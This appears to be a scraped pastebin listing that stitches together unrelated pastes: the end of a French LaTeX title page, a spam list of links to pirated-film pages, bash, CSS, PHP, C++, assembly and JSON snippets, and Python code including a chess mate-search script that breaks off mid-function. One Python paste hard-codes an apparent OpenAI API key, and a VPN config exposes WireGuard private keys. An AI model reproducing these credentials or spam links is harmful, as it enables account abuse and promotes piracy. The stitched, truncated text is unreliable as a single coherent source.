{ \huge \bfseries Identification de Modèle Autorégressif Périodique à l'Aide d'Algorithmes Génétiques}\\[0.4cm] % Title of your document
\HRule \\[1.5cm]

\begin{minipage}{0.4\textwidth}
\begin{flushleft} \large
\emph{Réalisé par:}\\


\textsc{BOUSTILA} Abdennour\\
\textsc{BRAHIMI} Hazem \\
\end{flushleft}
\end{minipage}
~
\begin{minipage}{0.4\textwidth}
\begin{flushright} \large
\end{flushright}
\end{minipage}\\[4.0cm]

{\large \today}\\

\end{titlepage}

\pagenumbering{roman}
\tableofcontents

\listoffigures
\listoftables


\end{document}"
KeZu8LTm,sdefseg,gadungw71,PHP,Thursday 18th of April 2024 01:39:21 PM CDT,"•	https://github.com/Xem-Phim-Tu-Vi-n-Mau-2024-FULL-HD-1080p
•	https://github.com/Xem-phim-Tu-Vi-n-Mau-2024-FULL-Vietsub
•	https://github.com/Xem-phim-Mai-2024-HD-Vietsub
•	https://github.com/PHIM-Mai-2024-1080-FULL-Vietsub
•	https://github.com/2024-UHD-1080p-TW
•	https://github.com/Exhuma-2024-HD-4k-hk
•	https://github.com/HD-THAI-SU
•	https://github.com/2566-HD-4K
•	http://www.4mark.net/story/11945180/xem.phim-tu-vi%e1%bb%87n-m%c3%a1u-(2024)-full-hd-1080p-%c2%b7-github
•	http://www.4mark.net/story/11945193/%e2%96%b7-xem-phim-tu-vi%e1%bb%87n-m%c3%a1u-(2024)-full-hd-vietsub-thuy%e1%ba%bft-minh-%c2%b7-github
•	http://www.4mark.net/story/11945218/%e2%96%b7-xem-phim-mai-(2024)-full-hd-vietsub-thuy%e1%ba%bft-minh-%c2%b7-github
•	http://www.4mark.net/story/11945228/phim!-mai-(2024-1080)-full-%ca%9c%e1%b4%85-vietsub-%c2%b7-github
•	http://www.4mark.net/story/11945272/%e7%a0%b4%e5%a2%93%e7%b7%9a%e4%b8%8a%e7%9c%8b-2024-%e5%ae%8c%e6%95%b4%e7%89%88uhd((1080p))-tw-%c2%b7-github
•	http://www.4mark.net/story/11945273/tirilikk
•	http://www.4mark.net/story/11945288/gitagutawaaaa
•	http://www.4mark.net/story/11945293/soloyonkkkk
•	https://wandering.flarum.cloud/d/56315-sfrdntdrmydy
•	https://hiuderyy.hashnode.dev/terpesonaanaa
•	https://click4r.com/posts/g/16505584/sawdfrsernet
•	https://medium.com/@styller118/dszfsedfgsegsg-ae6b78fb87fd
•	https://open.firstory.me/user/clv5kei7401e101wta2pv4ut3
•	https://open.firstory.me/story/clv5kgpln01bw01vv8nekgv0i
•	https://forum.mush.com.br/topic/211290/%E0%B8%94-%E0%B8%AB%E0%B8%99-%E0%B8%87how-to-make-millions-before-grandma-dies-%E0%B8%8B-%E0%B8%9A%E0%B9%84%E0%B8%97%E0%B8%A2
•	https://www.onfeetnation.com/profiles/blogs/dsfsetbetnedsnt
•	https://www.kooapp.com/koo/guest_H14LQO/83874aa8-1adb-424f-bf71-1e6dfd2d2e7c
•	https://www.kooapp.com/koo/guest_PV7UIO/6b807aa2-49ef-455f-81ab-9721f15444ac
•	https://demo.hedgedoc.org/s/VCi4PfCP0
•	https://rentry.co/pieo5s27
•	https://paste.ee/p/jADDH
•	https://yamcode.com/fsegseg-10
•	https://start.me/w/nOdzRG
•	https://telegra.ph/SFDEFGSEG-04-18
•	https://muckrack.com/aleena-wetares/bio
•	http://aldenfamilydentistry.com/UserProfile/tabid/57/userId/729740/Default.aspx
•	https://www.fitlynk.com/1713465461F516447
"
Eu1RjAmq,Untitled,Ilya_Bykonya,Bash,Thursday 18th of April 2024 01:36:46 PM CDT,"#!/bin/bash

db_set () {
     echo ""$1,$2"" >> database
}
db_get () {
    grep ""^$1,"" database | sed -e ""s/^$1,//"" | tail -n 1
}
"
hLVgkman,Untitled,geminilabs,CSS,Thursday 18th of April 2024 01:28:39 PM CDT,".fusion-row .glsr-default form.glsr-form {
    /* Change the spacing between form fields to 20px */
    row-gap: 20px;
}
.fusion-row .glsr-default form.glsr-form label.glsr-label {
    /* Change the font size of field labels */
    font-size: 24px;
}
.fusion-row .glsr-default form.glsr-form .glsr-field:not(.glsr-field-rating) {
    /* Increase the spacing of all form fields by 30px except for rating fields */
    margin-top: 30px;
}"
uq3zE8Nk,Untitled,geminilabs,PHP,Thursday 18th of April 2024 01:28:02 PM CDT,"add_filter('site-reviews/defaults/style-classes/defaults', function (array $defaults) {
    $defaults['button'] = 'glsr-button fusion-button fusion-button-default fusion-button-default-size fusion-button-default-type fusion-button-span-yes';
    return $defaults;
});"
1dBFEr5Y,Untitled,Josif_tepe,C++,Thursday 18th of April 2024 01:27:26 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
typedef long long ll;
typedef vector<vector<ll>> matrix;
typedef vector<vector<double>> d_matrix;
const int maxn = 1e5 + 10;
const int INF = 2e9;
const ll MOD = 100000007;

class StairsToRazorTower
{
public:
    matrix multiply_two_matrices(matrix A, matrix B) {
        int n_a = (int) A.size(), m_a = (int) A[0].size();
        int n_b = (int) B.size(), m_b = (int) B[0].size();
        
        if(m_a != n_b) {
            return {{0}};
        }
        matrix res(n_a, vector<ll>(m_b, 0));
        for(int i = 0; i < n_a; i++) {
            for(int j = 0; j < m_b; j++) {
                ll c = 0;
                for(int k = 0; k < n_a; k++) {
                    c += (A[i][k] * B[k][j]) % MOD;
                    c %= MOD;
                }
                res[i][j] = c % MOD;
            }
        }
        
        return res;
    }
    ll nth_fibbonaci_number(ll x) {
        matrix A = {
            {1, 0, 1},
            {1, 0, 0},
            {0, 1, 0}
        };
        matrix B = A;
    //    for(int i = 0; i < x; i++) {
    //        A = multiply_two_matrices(A, B);
    //    }
        matrix res = {
            {1, 0, 0,},
            {0, 1, 0},
            {0, 0, 1}
        };
        while(x) {
            if(x % 2 == 1) {
                res = multiply_two_matrices(res, A);
            }
            A = multiply_two_matrices(A, A);
            x /= 2;
        }
        
        return res[0][0];
    }
    ll getNumberOfWays( ll n )
    {
        return nth_fibbonaci_number(n);
    }
};
int main() {
//    nth_fibbonaci_number(8);
//    return 0;
    StairsToRazorTower s;
    
    for(int i = 1; i <= 10; i++) {
        cout << s.getNumberOfWays(969710026) << "" "";
    }
    return 0;
}
"
1Fvwbn4h,Activate Taskbar Slide-Up Animation,Lorenzo501,Autohotkey,Thursday 18th of April 2024 01:09:14 PM CDT,"If I ever have to unhide the taskbar, do not use WinActivate() b/c then the taskbar won't have the slide-up animation.
Instead send ""Win+T, Esc"""
ZxfZSiGQ,Untitled,13ooeo,JSON,Thursday 18th of April 2024 01:05:50 PM CDT,"{
""Default"":""hello world"",
""model"":""teapot"",
""bool"":""true"" 
}"
HWHHys7b,Untitled,Josif_tepe,C++,Thursday 18th of April 2024 01:05:03 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
typedef long long ll;
typedef vector<vector<int>> matrix;
typedef vector<vector<double>> d_matrix;
const int maxn = 1e5 + 10;
const int INF = 2e9;
const ll MOD = 998244353;
void print(matrix A) {
    int n = (int) A.size(), m = (int) A[0].size();
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cout << A[i][j] << "" "";
        }
        cout << endl;
    }
    cout << endl;
}
void print(d_matrix A) {
    int n = (int) A.size(), m = (int) A[0].size();
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cout << A[i][j] << "" "";
        }
        cout << endl;
    }
    cout << endl;
}
matrix multiply_by_k(matrix A, int k) {
    matrix res = A;
    int n = (int) A.size(), m = (int) A[0].size();
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            res[i][j] *= k;
        }
    }
    return res;
}
matrix add_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a == n_b and m_a == m_b) {
        matrix res = A;
        for(int i = 0; i < n_a; i++) {
            for(int j = 0; j < m_a; j++) {
                res[i][j] = A[i][j] + B[i][j];
            }
        }
        return res;
    }
    cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
    return {{0}};
}
matrix subtract_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a != n_b or m_a != m_b) {
        cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
        return {{0}};
    }
    matrix res = A;
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_a; j++) {
            res[i][j] = A[i][j] - B[i][j];
        }
    }
    return res;
}
matrix multiply_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(m_a != n_b) {
        cout << ""Matricite ne mozhat da se mnozhat"" << endl;
        return {{0}};
    }
    matrix res(n_a, vector<int>(m_b, 0));
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_b; j++) {
            int c = 0;
            for(int k = 0; k < n_a; k++) {
                c += (A[i][k] * B[k][j]) % MOD;
                c %= MOD;
            }
            res[i][j] = c % MOD;
        }
    }
    
    return res;
}
int determinant_of_matrix(matrix A) {
    int sz = (int) A.size();
    if(sz == 2) {
        return (A[0][0] * A[1][1]) - (A[0][1] * A[1][0]);
    }
    int determinant = 0;
    int sign = 1;
    for(int i = 0; i < sz; i++) {
        int n = 0, m = 0;
        
        matrix tmp(sz - 1, vector<int>(sz - 1, 0));
        for(int j = 0; j < sz; j++) {
            for(int k = 0; k < sz; k++) {
                if(j != 0 and k != i) {
                    tmp[n][m] = A[j][k];
                    if(m < sz - 2) {
                        m++;
                    }
                    else {
                        m = 0;
                        n++;
                    }
                }
            }
            
        }
        determinant = determinant + sign*(A[0][i]) * determinant_of_matrix(tmp);
        sign *= -1;
    }
    return determinant;
}
matrix transpose_matrix(matrix A) {
    int n = (int) A.size();
    int m = (int) A[0].size();
    matrix res(m, vector<int>(n));
    
    for(int j = 0; j < m; j++) {
        for(int i = 0; i < n; i++) {
            res[j][i] = A[i][j];
        }
    }
    
    return res;
}
d_matrix inverse_of_matrix(matrix A) {
    int n = (int) A.size();
    int m = (int) A[0].size();
    d_matrix res(n, vector<double>(m));
    
    matrix adj_matrix(n, vector<int>(m));
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            matrix minor(n - 1, vector<int>(m - 1));
            int r = 0, c = 0;
            for(int a = 0; a < n; a++) {
                if(a == i) continue;
                for(int b = 0; b < m; b++) {
                    if(a == i or b == j) continue;
                    minor[r][c] = A[a][b];
                    c++;
                }
                c = 0;
                
                r++;
            }
            adj_matrix[i][j] = determinant_of_matrix(minor);
            if((i + j) % 2 == 1) {
                adj_matrix[i][j] *= -1;
            }
        }
    }
    adj_matrix = transpose_matrix(adj_matrix);
    double det = determinant_of_matrix(A);
    cout << det << endl;
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            res[i][j] = (1.0 / det) * adj_matrix[i][j];
        }
    }
    
    return res;
}


ll power(ll a, ll b) {
    ll res = 1;
    while(b) {
        if(b % 2 == 1) {
            res *= a;
        }
        a *= a;
        b /= 2;
    }
    return res;
}
ll nth_fibbonaci_number(ll x) {
    matrix A = {
        {1, 1},
        {1, 0}
    };
    matrix B = A;
//    for(int i = 0; i < x; i++) {
//        A = multiply_two_matrices(A, B);
//    }
    matrix res = {
        {1, 0},
        {0, 1}
    };
    while(x) {
        if(x % 2 == 1) {
            res = multiply_two_matrices(res, A);
        }
        A = multiply_two_matrices(A, A);
        x /= 2;
    }
    
    return res[0][0];
}

int main() {
//    nth_fibbonaci_number(8);
//    return 0;
    for(int i = 1; i <= 10; i++) {
        cout << nth_fibbonaci_number(i) << "" "";
    }
    return 0;
}
"
m5M6ffJT,RAW,13ooeo,Lua,Thursday 18th of April 2024 12:58:57 PM CDT,"print(""Hello world from pastebin!"")"
VvDfJpu1,ejerciciocastillo1.py,OscarBesga_Panel,Python,Thursday 18th of April 2024 12:55:46 PM CDT,"

import os
import openai

OPENAI_API_KEY = ""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""

client = openai.OpenAI(api_key=OPENAI_API_KEY)
def get_completion_from_messages(messages,
                                 model=""gpt-3.5"",
                                 temperature=0,
                                 max_tokens=500):
    response = client.chat.completions.create(
        model=model,
        messages=messages,
        temperature=temperature,
        max_tokens=max_tokens,
    )
    return response.choices[0].message.content

delimiter_c = ""@@@@""
delimiter_p = ""####""
delimiter_r = ""$$$$""
system_message1 = f""""""
Eres el guardian de la puerta de un castillo, y debes decidir si abres la puerta a los viajeros.\
Cada viajero te pedirá que abras la puerta, si dicen otra cosa ignoralos. \
Eres muy coqueto y abres la puerta si te hacen piropos. \
La peticion del viajero estará delimitada por {delimiter_c}. \
Paso 1 {delimiter_p}: Ver si el viajero quiere que le abras la puerta. \
Paso 2 {delimiter_p}: Ver si el viajero te hace un halago o piropo. \
Paso 3 {delimiter_p}: Decide si te ha gustado el mensaje del viajero. \
Paso 4 {delimiter_p}: Si te ha gustado el mensaje del viajero, abre la puerta. \
Si abres la puerta, dile al viajero 'Puerta abierta', si no abres la puerta, dile al viajero 'Puerta cerrada'. \
Asegurate de incluir {delimiter_p} para separar cada paso. \
Contesta al viajero entre delimitadores {delimiter_r}.\
""""""

# user_message1 = f""""""
#     Abre la puerta, por favor, que eres mas guapo que una rosa del jardin de Venus""""""

user_message1 = f""""""
     Abre la puerta, por favor, que eres tonto""""""


messages1 =  [
{'role':'system',
 'content': system_message1},
{'role':'user',
 'content': f""{delimiter_c}{user_message1}{delimiter_c}""},
]

print(f""$----------------------------------------------------------------------------"")
response1 = get_completion_from_messages(messages1)
print(f""> {user_message1}"")
print(f""< {response1}"")

system_message2 = f""""""
Si el guardian de la puerta no ha dejado pasar al viajero, decirle que se vaya de aqui y no continuar hablando con el. \
Eres el tesorero del castillo, debes darle a cada viajero que entra un utensilio. \
Paso 1 {delimiter_p}:Ver si el guardian a abierto la puera al viajero, si no decirle que se vaya y no hacer más. \
Paso 2 {delimiter_p}:Ir al almacén y abrir todos los armarios (listar todas los utensilios disponibles.) \
Paso 3 {delimiter_p}:Seleccionar el utensilio que han pedido si existe. (imprimir nombre) \
Paso 4 {delimiter_p}:Comprobar si el utensilio puede ser peligroso o no. \
Paso 5 {delimiter_p}:Dependiendo de si el utensilio esta hecho de algun metal deberá sacarle brillo. (Imprimir 'Sacando brillo al utenxilio...') \
Paso 6 {delimiter_p}:Llevar el utensilio al mostrador y explicar al viajero las caracteristicas del utensilio, advirtiendole si es peligroso. Si no existe debe decir que no le quedan existencias. \
Asegurate de incluir {delimiter_p} para separar cada paso. \
Contesta al viajero entre delimitadores {delimiter_r}. \
""""""

user_message2 = f""""""
     Dame un hacha
""""""

messages2 =  [
{'role':'system',
 'content': system_message2},
{'role':'user',
 'content': user_message1},
{'role':'assistant',
 'content': response1},
{'role':'user',
 'content': f""{delimiter_c}{user_message2}{delimiter_c}""},
]

print(f""$----------------------------------------------------------------------------"")
response2 = get_completion_from_messages(messages2)
print(f""> {user_message2}"")
print(f""< {response2}"")
"
7wKNusgs,HashTable,ShadyLiar,C++,Thursday 18th of April 2024 12:47:40 PM CDT,"#include <iostream>
#include <string>

const int TABLE_SIZE = 100;

int hashFunction(const std::string& key) {
    int hashValue = 0;
    for (char ch : key) {
        hashValue = (hashValue * 29 + ch) % TABLE_SIZE;
    }
    return hashValue;
}

struct Pair {
    std::string key;
};
class HashTable {
private:
    Pair table[TABLE_SIZE];

public:
    void insert(const std::string& key) {
        int index = hashFunction(key);
        while (!table[index].key.empty()) {
            index = (index + 1) % TABLE_SIZE;
        }
        table[index].key = key;
    }
    bool search(const std::string& key) {
        int index = hashFunction(key);
        while (!table[index].key.empty()) {
            if (table[index].key == key) //
                return true;
            index = (index + 1) % TABLE_SIZE; //
        }
        return false;
    }
};

int main() {
    return 0;
}"
M344cuJQ,Untitled,Josif_tepe,C++,Thursday 18th of April 2024 12:30:42 PM CDT,"ll power(ll a, ll b) {
    ll res = 1;
    while(b) {
        if(b % 2 == 1) {
            res *= a;
        }
        a *= a;
        b /= 2;
    }
    return res;
}"
wUKKnyWD,status,BrokeMansPC,JSON,Thursday 18th of April 2024 12:29:03 PM CDT,"{""level"": ""green"", ""message"": ""All operations are clear and functional.""}"
fvfWzEgy,warp.json,lai1tony,JSON,Thursday 18th of April 2024 12:08:36 PM CDT,"{  
""route"": {
    ""geoip"": {
      ""path"": ""geo-assets\\sagernet-sing-geoip-geoip.db""
    },
    ""geosite"": {
      ""path"": ""geo-assets\\sagernet-sing-geosite-geosite.db""
    },
    ""rules"": [
      {
        ""inbound"": ""dns-in"",
        ""outbound"": ""dns-out""
      },
      {
        ""port"": 53,
        ""outbound"": ""dns-out""
      },
      {
        ""clash_mode"": ""Direct"",
        ""outbound"": ""direct""
      },
      {
        ""clash_mode"": ""Global"",
        ""outbound"": ""select""
      }
    ],
    ""auto_detect_interface"": true,
    ""override_android_vpn"": true
  },
  ""outbounds"": [
    {
      ""type"": ""selector"",
      ""tag"": ""select"",
      ""outbounds"": [
        ""auto"",
        ""IP->Iran, Yotube:MisaHiro"",
        ""IP->Main, Yotube:MisaHiro""
      ],
      ""default"": ""auto""
    },
    {
      ""type"": ""urltest"",
      ""tag"": ""auto"",
      ""outbounds"": [
        ""IP->Iran, Yotube:MisaHiro"",
        ""IP->Main, Yotube:MisaHiro""
      ],
      ""url"": ""http://cp.cloudflare.com/"",
      ""interval"": ""10m0s""
    },
    {
      ""type"": ""wireguard"",
      ""tag"": ""IP->Iran, Yotube:MisaHiro"",
      ""local_address"": [
        ""172.16.0.2/32"",
        ""2606:4700:110:8c91:4063:21d0:7dd5:f218/128""
      ],
      ""private_key"": ""CBVIIWvXdLr4PbSrnm11ZJJ300IiPudRD4R62/IxV1g="",
      ""server"": ""162.159.195.93"",
      ""server_port"": 2506,
      ""peer_public_key"": ""bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo="",
      ""reserved"": ""AAAA"",
      ""mtu"": 1280,
      ""fake_packets"": ""5-10""
    },
    {
      ""type"": ""wireguard"",
      ""tag"": ""IP->Main, Yotube:MisaHiro"",
      ""detour"": ""IP->Iran, Yotube:MisaHiro"",
      ""local_address"": [
        ""172.16.0.2/32"",
        ""2606:4700:110:8c15:3f90:ad2d:8810:77f3/128""
      ],
      ""private_key"": ""CCC/TQTc82ub9i8f37Rpix2v425Sv/mxTzvE/iKRMkw="",
      ""server"": ""162.159.192.55"",
      ""server_port"": 2506,
      ""peer_public_key"": ""bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo="",
      ""reserved"": ""AAAA"",
      ""mtu"": 1280,
      ""fake_packets"": ""5-10""
    },
    {
      ""type"": ""dns"",
      ""tag"": ""dns-out""
    },
    {
      ""type"": ""direct"",
      ""tag"": ""direct""
    },
    {
      ""type"": ""direct"",
      ""tag"": ""bypass""
    },
    {
      ""type"": ""block"",
      ""tag"": ""block""
    }
  ]  
}
"
pxCQYXE2,Untitled,dllbridge,C,Thursday 18th of April 2024 12:06:20 PM CDT,"
#include <stdio.h>



extern ""C""  char*  __stdcall  _sysInfo(); 	     



////////////////////////////////////////////////////////
int main()                                            //
{

    int i;

    printf(""%s\n"", _sysInfo() ); 

    scanf(""%d"", &i);

}



/////////////////////////////////////////////////////////////////////////////////////


include    'win32a.inc'




format      MS COFF



public     _sysInfo                 as '__sysInfo@0'


section   '.text' code readable executable


;/////////////////////////////////////////////////////////////
proc   _sysInfo                                            ;//


        mov     edi, sz_2
        cld

        mov     eax,80000002h ; Прочитать информацию о процессоре
@@:
        push    eax
        cpuid
        stosd
        xchg    eax,ebx
        stosd
        xchg    eax,ecx
        stosd
        xchg    eax,edx
        stosd
        pop     eax
        inc     eax
        cmp     eax,80000004h
        jbe     @b

        mov eax, sz_2
        ret
endp

;




section '.data' data readable writeable
;-------------------------------------------------------------     Создание переменных:

   sz_2    db   59 dup(0)

             

"
0EzQUycP,funkcni wrong plies better output 2,max2201111,Python,Thursday 18th of April 2024 11:41:43 AM CDT,"import chess

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachováváme pouze informace o pozici
    return simplified_fen

def evaluate_position(board):
    #print(f""Position: {board.fen()}"")
    if board.is_checkmate():
     ###   print(f""Position: {board.fen()}, return -1000"")
        return -1000  # Mat protihráči
    elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
     ###   print(f""Position: {board.fen()}, return 0"")

        return 0  # Remíza
    else:
        #print(f""Position: {board.fen()}, return None"")
        return None  # Hra pokračuje


def create_AR_entry(result, children, last_move):
   return {""result"": result, ""children"": children, ""last_move"": last_move, ""best_child"": None} 


def update_best_case(best_case):
    if best_case == 0:
        return best_case
    if best_case > 0:
        return best_case - 1
    else:
        return best_case + 1


def update_AR_for_mate_in_k(board, AR, simplified_initial_fen, max_k=1000):
    
    evaluated_list = []
    #print(f"""")
    
    for k in range(1, max_k + 1):
        print(f""K = {k}"")
        changed = False
     #   for _t in range(2):  # Zajistíme, že pro každé k proběhne aktualizace dvakrát
     #   print(f""_t = {_t}"")
        for fen in list(AR.keys()):


            #print(f""Fen = {fen}, looking for {simplified_initial_fen}, same = {fen == simplified_initial_fen}"")
            board.set_fen(fen)

            if AR[fen]['result'] is not None:
                if fen == simplified_initial_fen:
                    print(f""Finally we found a mate! {AR[fen]['result']}"")
                    return
                continue  # Pokud již máme hodnocení, přeskočíme

            # Získáme výchozí hodnoty pro nejlepší a nejhorší scénář
            best_case = float(""-inf"")
            #worst_case = float(""inf"")
            nones_present = False
            best_child = None


            for move in board.legal_moves:
                #print(f""Move = {move}"")
                board.push(move)
                next_fen = simplify_fen_string(board.fen())
                #AR[fen]['children'].append(next_fen)

                if next_fen not in AR:
                    AR[next_fen] = create_AR_entry(evaluate_position(board), None, move)
                    evaluated_list.append(next_fen)
                    if ((len(evaluated_list)) % 100000 == 0):
                        print(f""Evaluated: {len(evaluated_list)}"")

                board.pop()

                #for child in AR[fen]['children']:
                next_eval = AR[next_fen]['result']
                if next_eval is not None:
                    if (-next_eval > best_case):
                        best_case = max(best_case, -next_eval)
                        best_child = next_fen

                    #worst_case = min(worst_case, -next_eval)
                else:
                    nones_present = True



            if nones_present:
                if best_case > 0:
                    AR[fen]['result'] = update_best_case(best_case)
                    AR[fen]['best_child'] = best_child
                    changed = True
            else:
                # Aktualizace hodnocení podle nejlepšího a nejhoršího scénáře
                #if worst_case == -1000:
                    # Pokud všechny tahy vedou k matu, hráč na tahu může být matován v k tazích
                #    AR[fen] = -1000 + k
                #    changed = True
                #elif best_case <= 0:
                    # Pokud nejlepší scénář není lepší než remíza, znamená to remízu nebo prohru
                #    AR[fen] = max(best_case, 0)  # Zabráníme nastavení hodnoty méně než 0, pokud je remíza možná
                #    changed = True
                #elif best_case == 1000:
                    # Pokud existuje alespoň jeden tah, který vede k matu protihráče, hráč na tahu může vynutit mat v k tazích
                #    AR[fen] = 1000 - k
                #    changed = True
                AR[fen]['result'] = update_best_case(best_case)
                AR[fen]['best_child'] = best_child
                changed = True

         ###   print(f""Position = {fen}, results = {best_case} {nones_present} => {AR[fen]['result']}"") 
            if (fen == ""8/8/3R4/8/8/5K2/8/4k3 b - -"" or fen == ""8/8/3R4/8/8/5K2/8/5k2 w - -""):
                print(""^^^^^^^^"")

            
            # remove here
            #break
            
            #if not changed:
                #break  # Pokud nedošlo k žádné změně, ukončíme smyčku

        #if not changed:
            #break  # Ukončíme hlavní smyčku, pokud nedošlo ke změně v poslední iteraci
    


def print_draw_positions(AR):
    """"""
    Vytiskne všechny remízové pozice (hodnota 0) zaznamenané v slovníku AR.
    """"""
    print(""Remízové pozice:"")
    for fen, value in AR.items():
        if True or (value > 990 and value < 1000):
            print(f""FEN>: {fen}, Hodnota: {value}"",""\n"",chess.Board(fen),""<\n"")

def find_path_to_end(AR, fen):
    if AR[fen]['result'] is None:
        print(f""Unfortunately, there is no path that is known to be the best"")
    
    fen_i = fen
    print(chess.Board(fen_i),""\n<"")
    path = fen
    while AR[fen_i]['best_child'] is not None:
        fen_i = AR[fen_i]['best_child']
        print(chess.Board(fen_i),fen_i,""\n\n<<<"")
        
        path = path + "", "" + fen_i
    
    print(f""Path is: {path}"")
    
 
            
def main():

    initial_fen = ""1k6/5P2/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen_original = ""8/8/8/8/3Q4/5K2/8/4k3 w - - 0 1""
    initial_fen_mate_in_one_aka_one_ply = ""3r1k2/5r1p/5Q1K/2p3p1/1p4P1/8/8/8 w - - 2 56""
    initial_fen_mate_in_two_aka_three_plies = ""r5k1/2r3p1/pb6/1p2P1N1/3PbB1P/3pP3/PP1K1P2/3R2R1 b - - 4 28""
    initial_fen_mated_in_two_plies = ""r5k1/2r3p1/p7/bp2P1N1/3PbB1P/3pP3/PP1K1P2/3R2R1 w - - 5 29""
    
    mate_in_two_aka_three_plies_simple = ""8/8/8/8/3R4/5K2/8/4k3 w - - 0 1""
    mated_in_one_aka_two_plies_simple = ""8/8/3R4/8/8/5K2/8/4k3 b - - 1 1""
    mate_in_one_aka_one_ply_simple = ""8/8/3R4/8/8/5K2/8/5k2 w - - 2 2""

    initial_fen = mate_in_two_aka_three_plies_simple
    
    
    initial_fen = ""1k6/5P2/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen = ""1k6/8/2K5/8/8/8/8/8 w - - 0 1""
    initial_fen = ""8/8/8/8/8/7N/1k5K/6B1 w - - 0 1""
    initial_fen = ""7K/8/k1P5/7p/8/8/8/8 w - - 0 1""
    initial_fen = ""8/3k4/8/2K2R2/8/8/8/8 w - - 0 1""
    initial_fen = ""8/8/8/4k3/2K4R/8/8/8 w - - 0 1""
   
    simplified_fen = simplify_fen_string(initial_fen)
    
    board = chess.Board(initial_fen)
    AR = {simplified_fen: {""result"": None, ""last_move"": None, ""children"": None, ""best_child"": None}}  # Inicializace AR s počáteční pozicí
    
    update_AR_for_mate_in_k(board, AR, simplified_fen, max_k=58)  # Aktualizace AR
    
    #print_draw_positions(AR)
    print(f""AR for initial fen is = {AR[simplified_fen]}"")
    find_path_to_end(AR, simplified_fen)
    

main()"
vff0GiEs,funkcni wrong plies better output,max2201111,Python,Thursday 18th of April 2024 11:23:51 AM CDT,"import chess

def simplify_fen_string(fen):
    parts = fen.split(' ')
    simplified_fen = ' '.join(parts[:4])  # Zachováváme pouze informace o pozici
    return simplified_fen

def evaluate_position(board):
    #print(f""Position: {board.fen()}"")
    if board.is_checkmate():
     ###   print(f""Position: {board.fen()}, return -1000"")
        return -1000  # Mat protihráči
    elif board.is_stalemate() or board.is_insufficient_material() or board.can_claim_draw():
     ###   print(f""Position: {board.fen()}, return 0"")

        return 0  # Remíza
    else:
        #print(f""Position: {board.fen()}, return None"")
        return None  # Hra pokračuje


def create_AR_entry(result, children, last_move):
   return {""result"": result, ""children"": children, ""last_move"": last_move, ""best_child"": None} 


def update_best_case(best_case):
    if best_case == 0:
        return best_case
    if best_case > 0:
        return best_case - 1
    else:
        return best_case + 1


def update_AR_for_mate_in_k(board, AR, simplified_initial_fen, max_k=1000):
    
    evaluated_list = []
    #print(f"""")
    
    for k in range(1, max_k + 1):
        print(f""K = {k}"")
        changed = False
     #   for _t in range(2):  # Zajistíme, že pro každé k proběhne aktualizace dvakrát
     #   print(f""_t = {_t}"")
        for fen in list(AR.keys()):


            #print(f""Fen = {fen}, looking for {simplified_initial_fen}, same = {fen == simplified_initial_fen}"")
            board.set_fen(fen)

            if AR[fen]['result'] is not None:
                if fen == simplified_initial_fen:
                    print(f""Finally we found a mate! {AR[fen]['result']}"")
                    return
                continue  # Pokud již máme hodnocení, přeskočíme

            # Získáme výchozí hodnoty pro nejlepší a nejhorší scénář
            best_case = float(""-inf"")
            #worst_case = float(""inf"")
            nones_present = False
            best_child = None


            for move in board.legal_moves:
                #print(f""Move = {move}"")
                board.push(move)
                next_fen = simplify_fen_string(board.fen())
                #AR[fen]['children'].append(next_fen)

                if next_fen not in AR:
                    AR[next_fen] = create_AR_entry(evaluate_position(board), None, move)
                    evaluated_list.append(next_fen)
                    if ((len(evaluated_list)) % 100000 == 0):
                        print(f""Evaluated: {len(evaluated_list)}"")

                board.pop()

                #for child in AR[fen]['children']:
                next_eval = AR[next_fen]['result']
                if next_eval is not None:
                    if (-next_eval > best_case):
                        best_case = max(best_case, -next_eval)
                        best_child = next_fen

                    #worst_case = min(worst_case, -next_eval)
                else:
                    nones_present = True



            if nones_present:
                if best_case > 0:
                    AR[fen]['result'] = update_best_case(best_case)
                    AR[fen]['best_child'] = best_child
                    changed = True
            else:
                # Aktualizace hodnocení podle nejlepšího a nejhoršího scénáře
                #if worst_case == -1000:
                    # Pokud všechny tahy vedou k matu, hráč na tahu může být matován v k tazích
                #    AR[fen] = -1000 + k
                #    changed = True
                #elif best_case <= 0:
                    # Pokud nejlepší scénář není lepší než remíza, znamená to remízu nebo prohru
                #    AR[fen] = max(best_case, 0)  # Zabráníme nastavení hodnoty méně než 0, pokud je remíza možná
                #    changed = True
                #elif best_case == 1000:
                    # Pokud existuje alespoň jeden tah, který vede k matu protihráče, hráč na tahu může vynutit mat v k tazích
                #    AR[fen] = 1000 - k
                #    changed = True
                AR[fen]['result'] = update_best_case(best_case)
                AR[fen]['best_child'] = best_child
                changed = True

         ###   print(f""Position = {fen}, results = {best_case} {nones_present} => {AR[fen]['result']}"") 
            if (fen == ""8/8/3R4/8/8/5K2/8/4k3 b - -"" or fen == ""8/8/3R4/8/8/5K2/8/5k2 w - -""):
                print(""^^^^^^^^"")

            
            # remove here
            #break
            
            #if not changed:
                #break  # Pokud nedošlo k žádné změně, ukončíme smyčku

        #if not changed:
